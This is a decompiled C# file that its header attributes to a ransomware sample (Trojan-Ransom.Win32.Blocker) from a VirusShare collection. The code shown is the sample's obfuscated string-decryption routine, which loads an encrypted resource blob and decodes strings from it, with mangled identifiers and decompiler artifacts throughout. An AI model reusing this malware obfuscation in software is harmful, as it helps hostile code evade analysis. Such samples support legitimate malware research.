// Decompiled with JetBrains decompiler
// Type: .
// Assembly: SEX2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=a5787988e1da7ee4
// MVID: 027F678B-7D46-4866-9354-BA5F76CF2B30
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.asdg-51ed8d1a92fbb8f059c9595d28994dd3b17eb92e.exe

using \u0001;
using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u0001
{
  internal sealed class \u0006
  {
    [NonSerialized]
    internal static \u0002 \u0001;
    private static string \u0001;
    private static string \u0002;
    private static byte[] \u0001;
    private static Hashtable \u0001;
    private static bool \u0001;
    private static int \u0001;

    public static string \u0002([In] int obj0)
    {
      int num1;
      int num2;
      int num3;
      byte[] numArray1;
      string str1;
      string str2;
      try
      {
        obj0 -= \u0006.\u0001;
        do
        {
          if (\u0006.\u0001)
          {
            str2 = (string) \u0006.\u0001[(object) obj0];
            switch (str2)
            {
              case null:
                break;
              default:
                goto label_15;
            }
          }
          num3 = 0;
          num1 = obj0;
          num2 = (int) \u0006.\u0001[num1++];
          if ((num2 & 128) == 0)
          {
            num3 = num2;
            if (num3 == 0)
              return string.Empty;
            break;
          }
          if ((num2 & 64) == 0)
            num3 = ((num2 & 63) << 8) + (int) \u0006.\u0001[num1++];
          else
            goto label_8;
        }
        while (false);
        goto label_9;
label_8:
        num3 = ((num2 & 31) << 24) + ((int) \u0006.\u0001[num1++] << 16) + ((int) \u0006.\u0001[num1++] << 8) + (int) \u0006.\u0001[num1++];
label_9:
        string str3;
        try
        {
          numArray1 = \u0007\u0004.\u0099\u0002(\u0008\u0005.\u007E\u0001\u0006((object) \u0005\u0005.\u0003\u0006(), \u0006.\u0001, num1, num3));
          str1 = \u008E\u0003.\u0003\u0002(\u0008\u0005.\u007E\u0001\u0006((object) \u0005\u0005.\u0003\u0006(), numArray1, 0, numArray1.Length));
          if (\u0006.\u0001)
          {
            try
            {
              \u008C\u0004.\u007E\u001F\u0004((object) \u0006.\u0001, (object) obj0, (object) str1);
            }
            catch
            {
            }
          }
          str3 = str1;
        }
        catch
        {
          str3 = (string) null;
        }
        return str3;
label_15:
        return str2;
      }
      catch (Exception ex)
      {
        string str4 = str2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num2;
        byte[] numArray2 = numArray1;
        string str5 = str1;
        string str6;
        string str7 = str6;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj0;
        \u0008.\u0008.\u0002(ex, (object) str4, (object) local1, (object) local2, (object) local3, (object) numArray2, (object) str5, (object) str7, (object) local4);
        throw;
      }
    }

    static \u0006()
    {
      int int32;
      Stream manifestResourceStream;
      Assembly assembly1;
      try
      {
        // ISSUE: type reference
        \u0004.\u0002(\u001C\u0004.\u007F\u0003(__typeref (\u0006)));
        if (false)
          return;
        \u0006.\u0001 = "0";
label_2:
        \u0006.\u0002 = "161";
        if (true)
        {
          \u0006.\u0001 = (byte[]) null;
          \u0006.\u0001 = (Hashtable) null;
          \u0006.\u0001 = false;
        }
        else
          goto label_8;
label_4:
        \u0006.\u0001 = 0;
        if (true)
        {
          if (false)
            return;
          if (\u0006.\u0001 == "1")
            \u0006.\u0001 = true;
          else
            goto label_9;
        }
        else
          goto label_2;
label_8:
        if (true)
          \u0006.\u0001 = new Hashtable();
        else
          goto label_18;
label_9:
        if (true)
          \u0006.\u0001 = Convert.ToInt32(\u0006.\u0002);
        else
          goto label_4;
label_18:
        assembly1 = \u0098\u0004.\u001A\u0005();
        manifestResourceStream = assembly1.GetManifestResourceStream("{027f678b-7d46-4866-9354-ba5f76cf2b30}");
        try
        {
          int32 = Convert.ToInt32(manifestResourceStream.Length);
          \u0006.\u0001 = new byte[int32];
          int num = \u001A\u0005.\u007E\u007F\u0006((object) manifestResourceStream, \u0006.\u0001, 0, int32);
          \u001B\u0003.\u007E\u001D\u0006((object) manifestResourceStream);
        }
        finally
        {
          if (manifestResourceStream != null)
            \u001B\u0003.\u007E\u0086((object) manifestResourceStream);
        }
      }
      catch (Exception ex)
      {
        Assembly assembly2 = assembly1;
        Stream stream = manifestResourceStream;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) int32;
        \u0008.\u0008.\u0002(ex, (object) assembly2, (object) stream, (object) local);
        throw;
      }
    }
  }
}
